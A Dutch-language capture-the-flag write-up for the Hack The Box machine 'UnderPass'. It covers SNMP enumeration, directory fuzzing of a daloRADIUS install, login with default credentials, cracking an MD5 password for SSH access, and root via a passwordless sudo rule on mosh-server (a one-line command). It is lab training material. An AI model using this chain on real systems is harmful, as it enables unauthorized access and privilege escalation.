# UnderPass

Eerste nmap scan toont niks spannends en er draait wel een http server maar dat
is puur de standaard apache2 pagina.

Via een UDP scan lijkt er wel een poort 161 (snmp) te draaien.

```
Not shown: 60 closed udp ports (port-unreach), 39 open|filtered udp ports (no-response)
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!
```

Met `snmpwalk` en de `public` string krijgen we een set gegevens terug waaronder
een user. `steve@underpass.htb`. Daarnaast komt er ook een `daloradius` tekst
terug, dit lijkt ook te mappen met een pagina in de http server.

Met een fuzz actie komen we hier wel een aantal dingen op tegen.

```
 :: Method           : GET
 :: URL              : http://underpass.htb/daloradius/app/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
common                  [Status: 301, Size: 330, Words: 20, Lines: 10]
users                   [Status: 301, Size: 329, Words: 20, Lines: 10]
:: Progress: [4723/4723] :: Job [1/1] :: 1180 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Wat rond fuzzen en we vinden de volgende URL's:

- http://underpass.htb/daloradius/app/operators/login.php
- http://underpass.htb/daloradius/app/users/login.php

Bij de `operators` kunnen we inloggen met de standaard credentials voor
daloradius `administrator:radius`.

In de users vinden we een user genaamd `svcMosh:underwaterfriends`, password was
md5 dus snel te kraken. Met deze user hebben we ook gelijk SSH te pakken.

Hier zien we dat we zonder wachtwoord `/usr/bin/mosh-server` mogen draaien als
sudo, dit kunnen we combineren met de `--server` van mosh zelf wat aangeeft welk
commando moet draaien om mosh op te starten.

```
mosh --server="sudo /usr/bin/mosh-server" localhost
```

Nu verbinden we via mosh met een root mosh-server op naja onze eigen host en we
hebben root te pakken.

